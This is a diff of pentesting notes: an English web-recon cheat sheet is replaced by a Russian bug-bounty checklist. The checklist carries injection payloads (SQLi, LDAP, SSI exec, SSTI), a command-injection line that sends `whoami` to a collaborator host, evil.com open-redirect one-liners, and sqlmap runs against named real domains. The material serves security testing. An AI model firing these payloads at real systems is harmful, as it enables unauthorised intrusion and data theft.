@@ -1,338 +1,434 @@
-RECON Cheat-Sheat
-
-0)TOP Fuzz lists
-____________________________________________________
-https://wordlists.assetnote.io/
-https://github.com/orwagodfather/WordList/blob/main/SQL.txt
-https://github.com/six2dez/OneListForAll
-https://github.com/nu11pointer/fuzzlists/blob/main/Fuzzing
-
-https://github.com/missteek/cpts-quick-references?tab=readme-ov-file - hints CHECK!!!!!!!!!!
-
-https://habr.com/ru/companies/owasp/articles/352422/ - here are links to all other phase lists
-
-cewl https://example.com/* -w list.txt - create a custom wordlist
-____________________________________________________
-• read the target documentation - at the very beginning is a must
-
-1) subdomains:
-____________________________________________________
-• subfinder -d https://example.com/
-• sublist3r -d example.com - the most popular subdomain search engine
-• https://crt.sh/?q= - excellent subdomain search
-Terminal:
-export TARGET="example.com"
-curl -s "https://crt.sh/?q=${TARGET}&output=json" | jq -r '.[] | "\(.name_value)\n\(.common_name)"' | sort -u > "/home/kali/Desktop/Document/ffuz_txt/${TARGET}_crt.sh.txt"
-
-• amass enum -passive -d example.com - the best in my opinion!!!
-• assetfinder example.com
-• ffuf -w /home/kali/Desktop/Document/ffuz_txt/subdomains-top1million-110000.txt -u http://example.com -H "Host: FUZZ.example.com" -mc 200,302 -fl 518
-____________________________________________________
-• cat /home/kali/Desktop/Subdomens/Subdomen1 |anew /home/kali/Desktop/Subdomens/Subdomen2 - anew sorts and adds files that differ in Subdomen1
-• subzy run --targets /home/kali/Desktop/Subdomens/Subdomen2 - capture a subdomain
-• paramspider -l /home/kali/Desktop/Subdomens/Subdomen2 - search for working url
-
-____________________________________________________
-VHOST subdomain fuzzing is very important (different from regular subdomains)
-
-• ffuf -w /home/kali/Desktop/Document/ffuz_txt/subdomains-top1million-110000.txt -u https://www.example.com -H 'Host: FUZZ.example.com' -fs 0 (fs is optional)
-
-2)Technologies and search for ports and services
-____________________________________________________
-• (kali㉿kali)-[~]
-└─$ dig www.example.com
-on this IP, the DNS protocol should work like (53/tcp open domain syn-ack ISC BIND 9.16.48 (Ubuntu Linux)) and we take the IP on which this port is
-Example: dig @10.124.1.240 edu.stf MX
-
-• https://www.whois.com/
-• https://www.bigdomaindata.com/whois-history/ - useful if there is a new blocker now, you can look at the old info
-• https://w3techs.com/sites/info/example.com
-• https://builtwith.com/ - see what the web application uses
-• https://www.exploit-db.com/google-hacking-database, https://telegra.ph/5-Google-Dorks-kotorye-dolzhen-znat-kazhdyj-09-06 - check for Google dorks
-•https://pentest-tools.com/information-gathering/google-hacking - a site for searching for dorks
-https://telegra.ph/Nahodim-utekshie-v-set-konfidencialnye-dokument-03-30-2 - a site about how dorks work
-
-•https://sitereport.netcraft.com/?url= - once again look at what the web application uses and be sure to write out
-•Shodan - hostname:example.com - look at the info from Shodan
-
-• whatruns and wappalyzer
-• nmap -v -A example.com
-nmap -iL hosts.txt -Pn --min-rate 5000 --max-retries 1 --max-scan-delay 20 ms -T4 --top-ports 1000 --exclude-ports 22,80,443,53,5060,8080 --open -oX nmap.xml
-sudo nmap -sS -sV -O -A -T4 --script=vuln -p- --open -oA comprehensive_scan example.com nmap -Pn -sC -sV -oA tcp -p- -T4 -vvvvv --reason <ip adress> - sudo reconnaissance nmap -p- -sV -Pn -sC -v -T2 -D RND:10 10.124.1.233 - best nmap reconnaissance https://infosecwriteups.com/port-scan ning-for-bug-bounties-b28b23ce9fbf _____________________________________________________ 3)Url find _____________________________________________________ • )kali㉿kali)-[~/Desktop] └─$ cat wayback/domain.txt | waybackurls | tee -a wayback/domain_out.txt where wayback/domain.txt contains domains and wayback/domain_out.txt contains possible directories of these urls and endpoints
-• cat wayback/domain_out.txt | uro | tee -a wayback/domain_out_uro.txt
-- check which urls are working
-• (kali㉿kali)-[~/Desktop]
-└─$ cat wayback/domain_out_uro.txt | httpx | tee -a wayback/domain_out_httpx_uro.txt
-- removes URLs with identical values ​​in parameters
-
-to save time, open all URLs via plugin open-multiple-urls
-• scan domain/ip for additional ports - mandatory
-• scan directories: feroxbuster --url https://www.example.com --depth 2 --wordlist /home/kali/Desktop/Document/ffuz_txt/bigest_direcroty_fuzz --status-codes 200,500,401,302,403
---rate-limit 8
-https://codeby.net/threads/ehffektivnyj-fazzing-feroxbuster.81022/
-• ┌──(kali㉿kali)-[~/Downloads] 
-└─$ gospider -s https://example.com/ -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}' | grep "=" | qsreplace -a | dalfox pipe -o result.txt searches for xss throughout the site ifno limit on the number of packages
-
-• ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ - fuzz index. for different extensions and then we found php, for example
-https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt - list for fuzzing
-ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php - not sure if it works
-
-• Another useful thing that I recently discovered for myself. Open the console and run the script - it displays directories found in JS.
-
-javascript:(function(){var scripts=document.getElementsByTagName("script"),regex=/(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))/g;const results=new Set;for(var i=0;i<scripts.length;i++){var t=scripts[i ].src;""!=t&&fetch(t).then(function(t){return t.text()}).then(function(t){var e=t.matchAll(regex);for(let r of e)results.add(r[0])}).catch(function(t){console.log("An error occurred: ",t)})}var pageContent=document.documentElement.outerHTML,matches=pageContent.matchAll(regex);for(const match of matches)results.add(match[0]);function writeResults(){results.forEach(function(t){document.write(t+"<br>")})}setTimeout(writeResults,3e3);})();
-
-
-____________________________________________________
-
-4)Vulnerability Scans
-____________________________________________________
-
-• nikto -h https://example.com - scan web application for errors
-nikto -h example.com -ssl - if there is ssl it will show a lot of useful information, also nikto is very easy to spot and can be banned later
-• wapiti -v2 -u https://example.com - scan again and look open <...>
-
-• ​​wpscan --url https://example.com -e ap --plugins-detection passive --ignore-main-redirect - scans the site for plugins and looks at their vulnerabilities only for Wordpress!!!
-(--plugins-detection aggressive)
-• wpscan --url http://blog.example.com --enumerate --api-token Kffr4fdJzy9qVcTk<SNIP>
-• nuclei -u https://example.com -H "Cookie: cookie_value" -rl 3 -c 2 -as -o /home/kali/Desktop/Document/Nuclei_input - scans the site
--rl - number of requests per second
--c - number of simultaneously used templates
--as - automatically select templates using wapalayzer
--o - writes the result to a file
--H - used to add a header (not only cookies)
-• Nessus- https://kali:8834/#/scans/
-sudo systemctl status nessusd
-sudo systemctl start nessusd
-____________________________________________________
+# Контрольный список вознаграждений за обнаруженные ошибки для веб-приложения
 
-5)Additionally
-____________________________________________________
-• https://github.com/xnl-h4ck3r/xnLinkFinder 36:37 searches for links in js, but it is better to use Burp extension "JsLinkFinder"
-• RetireJS/retire.js - searches for outdated frameworks https://www.youtube.com/watchv=FqnSAa2KmBI&t1510s&ab_channel=HackerOne
-• https://github.com/bugcrowd/HUNT/blob/master/Burp/conf/issues.json 39:20
-• ./reconftw.sh -d target.com -a - scans almost everything possible (but I didn't like it) https://github.com/six2dez/reconftw
-• https://csp-evaluator.withgoogle.com/ - CSP XSS Bypass shows what vulnerabilities are in CSP
+[](https://github.com/sehno/Bug-bounty/blob/master/bugbounty_checklist.md#bug-bounty-checklist-for-web-app)
 
-Identifying Map Source Files
-Map source files are usually loaded when you open the development tools. Testers can also find map source files by adding the ".map" extension after the extension of each external JavaScript file. For example, if a tester sees a file, they can check for the presence of its map source file by visiting ./static/js/main.chunk.js - ./static/js/main.chunk.js.map
-____________________________________________________
+> Этот контрольный список может помочь вам разработать хорошую методологию для охоты за ошибками.  
+> Когда вы выполните действие, не забудьте проверить ;)  
+> Удачной охоты!
 
-6)API Recon
-____________________________________________________
 
-Information taken from https://readmedium.com/5-methods-i-use-to-discover-apis-6d646baa3ffb
-----------------
-----------------
-#1 — API Documentation
-But sometimes documentation is publicly available for no reason other than excessive display.
+## Разведка на подстановочном домене
 
-In any case, this is very useful information. It not only displays the API endpoints of the main application, but also explains how the API itself functions:
 
-• What types of data a particular endpoint expects to receive (integer/string, JSON/XML, POST/PUT/GET, etc.)
-• Required headers to send
-• The response we should receive for the request
-• The level of authentication required for a particular endpoint
+- [ ] Беги, amass
+- [ ] Запустить subfinder
+- [ ] Запустить assetfinder
+- [ ] Запустить dnsgen
+- [ ] Запустить massdns
+- [ ] Использовать httprobe
+- [ ] Запустить aquatone (скриншот для живого хоста)
 
-In case our target does not have API documentation, we can create our own documentation for the application without much effort. Read more about this in this article: How to craft rogue API docs for a target when they don't exist. https://danaepp.com/how-to-craft-rogue-api-docs-for-a-target-when-they-dont-exist - Very interesting/useful article
-----------------
-----------------
-#2 - API OSINT research
+## Единый домен
 
-• Developers are constantly working on APIs and probably use different tools to create, test, and document different versions of the API.
-• It is likely that there are older versions of the APIapplications that we can find, and they may be less secure than the current version in production!
 
-Let's talk about a few OSINT tools that we can easily use and get results pretty quickly.
 
-Google Dorking:
-A quick Google dorking search can give us:
+### Сканирование
 
-• Target subdomains related to the API
-• Target API documentation page
-• API endpoints - old and current versions
 
-site:target.com inurl:”/v1"
-site:target.com inurl:”/api"
-site:target.com inurl:”/graphql"
-site:target.com intitle:”api*”
+- [ ]  Nmap scan
+- [ ]  Burp crawler
+- [ ]  ffuf (directory and file fuzzing)
+- [ ]  hakrawler/gau/paramspider
+- [ ]  Linkfinder
+- [ ]  Url with Android application
 
-WaybackMachine:
-One of the best tools to discover API endpoints and collect some secrets at the same time is WaybackMachine .
-Just by searching for the company domain and filtering for the word “api” we got several API endpoints that even contained GraphQL.
+### Ручная проверка
 
-Using the credentials found, I can sometimes test API endpoints after authentication with different user permissions .
-Also, it is recommended to integrate GAU or Waymore into your reconnaissance automation system to extract more API endpoints .
 
-Postman(Sort of like Burp for APIs):
+- [ ]  Shodan
+- [ ]  Censys
+- [ ]  Google dorks
+- [ ]  Pastebin
+- [ ]  Github
+- [ ]  OSINT
 
-Postman is available as a SaaS application on postman.com and allows developers to share projects to make it easier for teams to work together. The postman project, also known as a postman collection, is generally considered private. But in many cases, you will see that collections are publicly exposed. Collections have a lot of details like parameters, headers, body data, environment variables, and authorization tokens.
+### Сбор информации
 
-GitHub:
-With a few keywords, we maximize our chances of finding API endpoints and a detailed explanation of how they work.
 
-Some common keywords for API:
 
-/v1
-/api
-apikey
-api_key
-apidocs
-api_secret
-x-api-key
-/graphql
+- [ ] Вручную исследуйте сайт
+- [ ] Поиск/сканирование на предмет пропущенного или скрытого контента
+- [ ] Проверьте файлы, раскрывающие контент, такие как robots.txt, sitemap.xml, .DS_Store
+- [ ] Проверьте кэши основных поисковых систем на наличие общедоступных сайтов.
+- [ ] Проверьте наличие различий в контенте на основе User Agent (например, мобильные сайты, доступ в качестве поискового робота)
+- [ ] Выполнение отпечатков веб-приложений
+- [ ] Определить используемые технологии
+- [ ] Определите роли пользователей
+- [ ] Определите точки входа приложения
+- [ ] Определить клиентский код
+- [ ] Определите несколько версий/каналов (например, веб, мобильный веб, мобильное приложение, веб-сервисы)
+- [ ] Определите совместно размещенные и связанные приложения
+- [ ] Определите все имена хостов и порты
+- [ ] Определите сторонний размещенный контент
+- [ ] Определить параметры отладки
 
-As with Postman and WaybackMachine, in GitHub we also have a good chance of finding some secrets and credentials that might be useful in the next steps of the interaction.
-----------------
-----------------
-#3 — HTML and Javascript Applications
-In FireFox, if we open DevTools (F12) and open the Debugger tab (or the Sources tab in Chrome), we will see the address of our target and a small arrow pointing down. Clicking on the small arrow will get us the frontend resources, including the Javascript file.
+### Управление конфигурацией
 
-After finding the Javascript files, we usually get a piece of minified code, without newlines and spaces
-In this case, we can use a JS pretifier, for example this one . https://beautifier.io/
 
-After that, just copy the code into your code editor, such as VSCode or Sublime, and start searching for API requests.
 
-Look for keywords like API, v1, v2, user, and other common words related to API. Another thing to do is to look for HTTP methods, which indicate sending a request to the backend .
+- [ ] Проверьте наличие часто используемых URL-адресов приложений и административных адресов.
+- [ ] Проверьте наличие старых, резервных и неиспользуемых файлов
+- [ ] Проверьте поддерживаемые методы HTTP и межсайтовую трассировку (XST)
+- [ ] Тестовая обработка расширений файлов
+- [ ] Тестирование заголовков HTTP безопасности (например, CSP, X-Frame-Options, HSTS)
+- [ ] Тестирование политик (например, Flash, Silverlight, роботы)
+- [ ] Тестирование непроизводственных данных в реальной среде и наоборот
+- [ ] Проверка наличия конфиденциальных данных в клиентском коде (например, ключей API, учетных данных)
 
-Also, if we want an automated tool, we can use Katana
+### Безопасная передача
 
-A good recommendation would be to use Katana and view the output, then run it again with a few additional settings for a specific web application.
 
-By viewing the HTML and Javascript of the application, we can map most of the API calls and even uncover shadow APIs. https://www.cloudflare.com/learning/security/api/what-is-shadow-api/
 
-Due to the low vulnerability of shadow APIs, they tend to have a higher vulnerability potential since they are tested very rarely.
+- [ ] Проверьте версию SSL, алгоритмы, длину ключа
+- [ ] Проверка действительности цифрового сертификата (срок действия, подпись и CN)
+- [ ] Проверьте учетные данные, доставленные только по HTTPS
+- [ ] Убедитесь, что форма входа доставляется по протоколу HTTPS.
+- [ ] Проверьте токены сеанса, доставленные только по HTTPS
+- [ ] Проверьте, используется ли HTTP Strict Transport Security (HSTS)
 
-----------------
-----------------
-#4 - Active Scanning - Fuzzing
+### Аутентификация
 
-When it comes to API fuzzing, there are two important things to consider:
 
-• Fuzzers/Scanners: This is basically a tool that sends HTTP requests and filters the responses so that we can determine in advance what exactly we are interested in.
-• Wordlists: The content we are fuzzing. A good wordlist is the difference between finding a vulnerability for simply running common words and wasting your time.
 
-These days, there are many tools that do a great job of API discovery through fuzzing. For simple GET requests with a list of endpoints, we can always use tools like Burp Intruder, ffuf, GoBuster, Kiterunner, and even create your own fuzzer. In most cases, I find ffuf and Kiterunner (https://github.com/assetnote/kiterunner) to be great tools, not only in terms of speed but also the useful features they provide, such as filtering by size, status code, words, etc. Specifically about Kiterunner, combining relevant lists from Assetnote, this tool is great for modern web applications (NodeJS, Flask, Rails, etc.).
+- [ ] Тест на подсчет пользователей
+- [ ] Тест на обход аутентификации
+- [ ] Тест на защиту от перебора
+- [ ] Правила проверки качества пароля
+- [ ] Тест функциональности «Запомнить меня»
+- [ ] Тест автозаполнения форм/ввода пароля
+- [ ] Тестовый сброс и/или восстановление пароля
+- [ ] Тестовый процесс смены пароля
+- [ ] Тест CAPTCHA
+- [ ] Тестовая многофакторная аутентификация
+- [ ] Тест на наличие функции выхода из системы
+- [ ] Тест управления кэшем по HTTP (например, Pragma, Expires, Max-age)
+- [ ] Тест на логины по умолчанию
+- [ ] Тест на доступность истории аутентификации для пользователя
+- [ ] Тестирование внеканальных уведомлений о блокировках учетных записей и успешных сменах паролей.
+- [ ] Тестирование единообразной аутентификации в приложениях с общей схемой аутентификации/SSO
+
+### Управление сеансом
+
 
-With a single command you can get a very good idea of ​​the API picture of your target:
 
-./kr scan https://target.com -w ~/wordlists/routes-large.json
+- [ ] Установите, как осуществляется управление сеансами в приложении (например, токены в файлах cookie, токен в URL)
+- [ ] Проверка токенов сеанса на наличие флагов cookie (только http и безопасно)
+- [ ] Проверьте область действия сеансового cookie-файла (путь и домен)
+- [ ] Проверьте длительность сеанса cookie (срок действия и максимальный возраст)
+- [ ] Проверить завершение сеанса после максимального срока службы
+- [ ] Проверить завершение сеанса после относительного тайм-аута
+- [ ] Проверить завершение сеанса после выхода из системы
+- [ ] Проверьте, могут ли пользователи иметь несколько одновременных сеансов.
+- [ ] Тестирование сеансовых куки-файлов на случайность
+- [ ] Подтвердите, что новые токены сеанса выдаются при входе в систему, смене роли и выходе из системы.
+- [ ] Тестирование согласованного управления сеансами в приложениях с помощью общего управления сеансами.
+- [ ] Тест на головоломку сеанса
+- [ ] Тест на CSRF и кликджекинг
+
+### Авторизация
+
+
+- [ ] Тест на прохождение пути
+- [ ] Тест на обход схемы авторизации
+- [ ] Тест на наличие проблем с вертикальным контролем доступа (также известный как повышение привилегий)
+- [ ] Тест на наличие проблем с горизонтальным контролем доступа (между двумя пользователями с одинаковым уровнем привилегий)
+- [ ] Тест на отсутствие авторизации
+
+### Проверка данных
+
+
+
+- [ ] Тест на наличие отраженного XSS
+- [ ] Тест на наличие сохраненного XSS
+- [ ] Тест на XSS на основе DOM
+```
+ '\"`><img src=x>THE HACKER WAS HERE${{7'*7'}}
+```
+
+```
+- Paramspider :-
+    
+- python3 paramspider.py --domain indrive.com
+    
+- python3 paramspider.py --domain [https://cpcalendars.cartscity.com](https://cpcalendars.cartscity.com/) --exclude woff,css,js,png,svg,php,jpg --output g.txt
+    
+- cat indrive.txt | kxss  ( looking for reflected :-  "<> )
+```
 
-In addition, in addition to the API endpoints, we also need to discover what parameters are accepted by the backend. Of course, there are the "default" parameters of legitimate requests, but what if there are also "shadow parameters"? Maybe we can seeWe can find a mass-purpose vulnerability that we have no other way to find except by vaguely defining the target. For this task, I see Arjun as one of the best tools.
+
+- [ ] Тест на перекрестное мигание
+- [ ] Тест на HTML-инъекцию
+- [ ] Тест на SQL-инъекцию
+
+```
+- echo [https://www.recreation.gov](https://www.recreation.gov/) | waybackurls | grep "?" | uro | httpx -silent > param.txt
+    
+- cat subdomains.txt | waybackurls | grep "?" | uro | httpx -silent > param.txt
+    
+- sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt
+    
+- sqlmap -u [https://my.easyname.at/en/login](https://my.easyname.at/en/login) --dbs --forms --crawl=2
+```
 
-Arjun is a Python tool that simply sends GET requests to a given URL with a large number of different parameters. At the end, the tool will give us a list of valid parameters for further testing. I will write more about using Arjun in a future article about API hacking.
+ SQLi One Linear :
+```
 
-Wordlists:
-Using the right wordlist is the key to successful API penetration testing. There are some great resources for this mission: SecLists , Assetnote , FuzzDB and others.
+[](https://github.com/WadQamar10/My-Hunting-Methodology-/blob/main/My%20Bug%20Hunting%20Methodology.md#sqli-one-linear--)
 
-Lazy hackers will use generic wordlists that simply contain a huge number of words but without any specific target. Professionals will always try to get more specific wordlists according to the target. For example, if we know that our target is a car rental web application based on Django as a backend, we can combine a common wordlist for Django with a custom wordlist for car rental. For the first wordlist, we can use assetnote
+- cat target.com | waybackurls | grep "?" | uro | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
+    
+- subfinder -dL domains.txt | dnsx | waybackurls | uro | grep "?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
+```
 
-And second, we can ask ChatGPT to generate a list of common API endpoints for car rental.
-----------------
-----------------
-#5 - Mobile
+- [ ] Тест на инъекцию LDAP
+возникает, когда пользовательский ввод используется в LDAP-запросах без должной фильтрации
+```
+*)(|(objectClass=*))
+```
+**Тестирование на входе**: Если есть форма входа, попробуйте:
+```
+username: admin)(|(password=*))
+password: anything
 
-In this case, it may mean that the APIs that exist in the Javascript of the web application will not match the API endpoints that exist in the APK file.
+```
 
-We can use static analysis tools like JADX and MobSF to get some of the hard-coded API endpoints that are in the APK.
+- [ ] Тест на инъекцию ОRМ
+```
+' OR 1=1 -- 
+```
 
-Using the above techniques, we will have a thorough picture of the application and will have a great foundation for hacking the APIs of different applications.
-____________________________________________________
+- [ ] Тест на XML-инъекцию
+- [ ] Тест на инъекцию XXE
 
-7)Deobfuscation code
-____________________________________________________
-• https://obfuscator.io/ - site for obfuscation code
-• https://jsfuck.com/ - site for obfuscation code in the form [+[]]])[+!+[]
-• https://jsconsole.com/ - online js console
-• http://www.jsnice.org/ - site for Deobfuscation code (makes the code more readable)
 
-• Decoding:
-echo aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8K | base64 -d - base64 decode
-echo 68747470733a2f2f7777772e6861636b746865626f782e65752f0a | xxd -p -r - hex decode
+_Советы_
 
-• https://www.boxentriq.com/code-breaking/cipher-identifier - will determine what cipher is used
+- Для каждого XML-входа, который вы видите, попробуйте XXE
+- Для каждой загрузки документа попробуйте загрузить файл docx. Они также могут быть уязвимы для XXE.
+- Для каждой загрузки изображения попробуйте загрузить SVG, вы также можете сделать XXE через SVG.
 
-• hashcat -a 3 -m 16500 /home/kali/Desktop/Document/ffuz_txt/jwt.txt ?a?a?a?a?a?a?a -i --increment-min=4 - jwt secret finder (not only jwt (enumerate everything))
 
-https://jwt.io/
 
-----------------------------------------------
-Reading JavaScript
+- [ ] Тест на инъекцию SSI
+```
+<!--#exec cmd="ls"-->
+```
 
-If React is used and a .map file for javascript is specified.
+- [ ] Тест на XPath-инъекцию
+```
+' or '1'='1
+```
 
-Unpacking the application source code
-There are many tools for unpacking the source code of a React application. One of them is mentioned in the blog post above.
-https://github.com/rarecoil/unwebpack-sourcemap?source=post_page-----8b132f81174b--------------------------------
+- [ ] Тест на внедрение XQuery
+```
+Попробуйте внедрить выражения XQuery в запросы.
+```
+
+- [ ] Тест на IMAP/SMTP-инъекцию
+```
+Введите специальные символы для манипуляции командой, например, `rcpt to:`
+```
+
+- [ ] Тест на инъекцию команды
+- [ ] Тест на внедрение кода
+```
+||sleep+10+%23||     pwd      ´pwd´      `pwd`   # pwd #    ;pwd #
+```
+
+```
+email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
+```
+
+ Php injection
+```
+ '; phpinfo();//
+```
+
+
+- [ ] Тест на SSTI
+- [ ] Тест на внедрение языка выражений
+
+```
+${{<%[%'"}}%\.
 
-But personally I used a tool created by @spaceraccoon called webpack-exploder.
-You can unpack the .map file using the UI hosted online by spaceracoon himself here: https://spaceraccoon.github.io/webpack-exploder/
+FOR Testing SSTI and tplmap tool :-
 
-Using this tool and getting the source code which can contain a lot of interesting stuff
+- git clone [https://github.com/epinna/tplmap.git](https://github.com/epinna/tplmap.git)
+    
+- ./tplmap.py -u "domain.com/?parameter=SSTI*"
+    
 
---------------
+---
 
-A small tool I created is designed to solve exactly this problem, called BitMapper, it adds a micro sourceMappingURL to every javascript file it sees, giving us the ability to force the browser to decode hidden map files.
+- httpx -l live_subs.txt --status-code --title -mc 200 -path /phpinfo.php
+    
+- httpx -l live_subs.txt --status-code --title -mc 200 -path /composer.json
+    
 
-https://github.com/BitTheByte/BitMapper?source=post_page-----dd08ed34b5a8--------------------------------
+---
 
--------------
-If you have Meteor.js
+######## Testing for xss and sqli at the same time >_< ##############
 
-https://bitthebyte.medium.com/javascript-for-bug-bounty-hunters-part-3-3b987f24ab27
+- cat subdomains.txt | waybackurls | uro | grep "?" | httpx -silent > param.txt
+    
+- sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt
+    
+- cat param.txt | kxss
+```
 
-______________________________________________________________________________________________________________
-OSINT sites
 
-Here is a list of 30 cybersecurity search engines (May contain viruses):
+- [ ] 1
+- [ ] Тест на HTTP-разделение/контрабанду
+- [ ] Тест на подделку HTTP-глаголов
+- [ ] Тест на открытое перенаправление (Open Redirect)
 
-If the server is NGnix - https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies
+Open Redirection OneLiner :
 
-1. [Dehased](https://dehased.com/) - viewing leaked credentials. (virus most likely)
-2. [SecurityTrails](https://securitytrails.com/) — Extensive DNS data.
-3. [DorkSearch](https://dorksearch.net/) — Really fast Google search.
-4. [ExploitDB](https://www.exploit-db.com/) — Archive of various exploits.
-5. [ZoomEye](https://www.zoomeye.org/) — Gather information about targets.
-6. [Pulsedive](https://pulsedive.com/) — Search information about threats.
-7. [GrayHatWarefare](https://buckets.grayhatwarfare.com/) — Search public S3 buckets.
-8. [PolySwarm](https://polyswarm.network/) — Scan files and URLs for threats.
-9. [Fofa](https://fofa.so/) — search for various information about threats.
-10. [LeakIX](https://leakix.net/) — search for publicly available information.
-11. [DNSDumpster](https://dnsdumpster.com/) — quick search for DNS records.
-12. [FullHunt](https://www.fullhunt.io/) — search and discover attack surfaces.
-13. [AlienVault](https://www.alienvault.com/) — extensive threat intelligence.
-14. [ONYPHE](https://www.onyphe.io/) — collects intelligence data on cyber threats.
-15. [Grep App](https://grep.app/) — search half a million Git repositories.
-16. [URL Scan](https://urlscan.io/) — free service for scanning and analyzing websites.
-17. [Vulners](https://vulners.com/) — Search for vulnerabilities in a large database.
-18. [WayBackMachine](https://archive.org/web/) — view the contents of remote websites.
-19. [Shodan](https://www.shodan.io/) — Search for devices connected to the Internet.
-20. [Netlas](https://netlas.io/) — search and monitor resources connected to the Internet.
-21. [CRT.sh](https://crt.sh/) — search for certificates registered by CT.
-22. [Wigle](https://wigle.net/) — Database of wireless networks with statistics.
-23. [PublicWWW](https://publicwww.com/) — Marketing and affiliate marketing research.
-24. [Binary Edge](https://www.binaryedge.io/) — Scans the Internet for threats.
-25. [GreyNoise](https://greynoise.io/) — Search for devices connected to the Internet.
-26. [Hunter](https://hunter.io/) — Search for email addresses belonging to a website.
-27. [Censys](https://censys.io/) — Assess the attack surface of devices connected to the Internet.
-28. [IntelligenceX](https://intelx.io/) — Search Tor, I2P, data leaks, domains, and email.
-29. [Packet Storm Security](https://packetstormsecurity.com/) — Browse the latest vulnerabilities and exploits.
-30. [SearchCode](https://searchcode.com/) - Find 75 billion lines of code from 40 million projects.
+```
+- waybackurls tesorion.nl | grep -a -i =http | qsreplace 'evil.com' | while read host do;do curl -s -L $host -I| grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done
+    
+- httpx -l i.txt -path "///evil.com" -status-code -mc 302
+```
 
-Please note: While these search engines provide useful cybersecurity information, it is important to use them responsibly and ethically.
+- [ ] Тест на включение локального файла
+- [ ] Тест на включение удаленного файла
 
-________________________________________________________________________________________________________
-Most applications use some sort of naming scheme for their
-content and functionality. Based on the resources already identified in the
-application, you can fine-tune the automatic enumeration to increase the
-likelihood of discovering further hidden content.
-Note that in the EIS application, all resources in /auth begin with a capital letter. This means you need to customize the enumeration of the directory listings specifically for the site.
+_Советы_
 
-Review these lists to determine the naming schemes used. For example, if you have
-pages named AddDocument.jsp and ViewDocument.jsp, there may also be pages named EditDocument.jsp and RemoveDocument.jsp.
+- Если файл или изображение загружается с локального диска, попробуйте LFI/RFI (пример file=test.jpg)
+- Держите VPS под рукой на случай, если вам понадобится сделать запрос информации
 
-You can often get a sense of developers' naming habits by simply reading a few examples. For example, depending on their personal style, developers may be verbose (AddANewUser.asp), terse (AddUser.asp), abbreviated (AddUsr.asp), or even more cryptic (AddU.asp). Understanding the naming styles used can help you guess the exact names of content that you have not yet identified.
+- [ ] Сравните правила проверки на стороне клиента и на стороне сервера
+- [ ] Тест на NoSQL-инъекцию
+- [ ] Тест на загрязнение HTTP-параметров
 
-3. Sometimes the naming scheme used for different content uses identifiers such as numbers and
-dates, which can make it easier to identify hidden content.
-This is most often seen in static resource names rather than dynamic scripts.
-For example, if a company's website references AnnualReport2009.pdf and AnnualReport2010.pdf,
-this should be a small step toward determining what the next report will be called. Somewhat unbelievably, there have been infamous cases of companies posting files containing financial statements on their web servers before they were publicly announced, only to have them discovered by wily journalists based on the naming scheme used in previous years.
+- можно обойти фильтр если добавить точно такой же аргумент но другое значение
+```
+https://twitter.com/i/u?iid=F6542&uid=2321301342&uid=1134885524&nid=22+26    (два UID)
+```
+
+- [ ] Тест на автоматическое связывание (IDOR)
+
+```
+--------
+GET api/1234/../1235/profile     - IDOR второго порядка
+--------
+если GET api/me/profile то попробывать GET api/1235/profile
+--------
+GET api/v2/1235/profile - 403  всегда стоит посмотреть другие версии api
+GET api/v1/1235/profile - 200
+--------
+GET api/v1/?profile=1234&?profile=1235      есть шанс что сервер не правильно обработает запрос 
+--------
+IN Json:
+Опять же, в зависимости от того, как обрабатываются наши входные данные, мы можем ввести нежелательное поведение, заменив наш идентификатор на:
+
+массив идентификаторов: [1234, 1235]
+логическое значение: true/false (будьте внимательны при тестировании)
+подстановочный знак, такой как звездочка (*) или знак процента (%) (опять же, будьте осторожны при тестировании)
+большое целочисленное значение, добавив нули перед нашим идентификатором: 00001235
+отрицательный идентификатор: -1
+десятичное число: 1235.0
+строковое значение с добавленным разделителем: "1234,1235"
+```
+
+```
+Open Redirection OneLiner :-
+
+- waybackurls tesorion.nl | grep -a -i =http | qsreplace 'evil.com' | while read host do;do curl -s -L $host -I| grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done
+    
+- httpx -l i.txt -path "///evil.com" -status-code -mc 302
+```
+
+- [ ] Тест на массовое назначение
+
+**Массовое назначение** (или **mass assignment**) происходит, когда приложение позволяет устанавливать значения полей, которые не должны быть доступны пользователю. Это может произойти, если не используется фильтрация параметров, что может привести к уязвимостям.
+
+- [ ] Тест на наличие NULL/недействительного сеансового cookie-файла
+
+```
+Set-Cookie: sessionId=NULL
+```
+
+
+
+
+### Отказ в обслуживании
+
+
+- [ ] Тест на антиавтоматизацию
+- [ ] Тест на блокировку аккаунта
+- [ ] Тест на DoS-атаку протокола HTTP
+- [ ] Тест на DoS-атаки с использованием подстановочных знаков SQL
+
+### Бизнес-логика
+
+
+
+- [ ] Тест на неправильное использование функций
+- [ ] Тест на отсутствие неотказуемости
+- [ ] Тест на доверительные отношения
+- [ ] Проверка целостности данных
+- [ ] Тестовое разделение обязанностей
+
+### Криптография
+
+
+- [ ] Проверьте, не зашифрованы ли данные, которые должны быть зашифрованы.
+- [ ] Проверка на наличие неправильных алгоритмов использования в зависимости от контекста
+- [ ] Проверьте использование слабых алгоритмов
+- [ ] Проверьте правильность использования соления.
+- [ ] Проверка функций случайности
+
+### Рискованная функциональность — загрузка файлов
+
+
+- [ ] Проверьте, что допустимые типы файлов занесены в белый список.
+- [ ] Проверьте, что ограничения на размер файла, частоту загрузки и общее количество файлов определены и соблюдаются.
+- [ ] Проверьте, что содержимое файла соответствует определенному типу файла.
+- [ ] Проверьте, что все загружаемые файлы проходят антивирусную проверку.
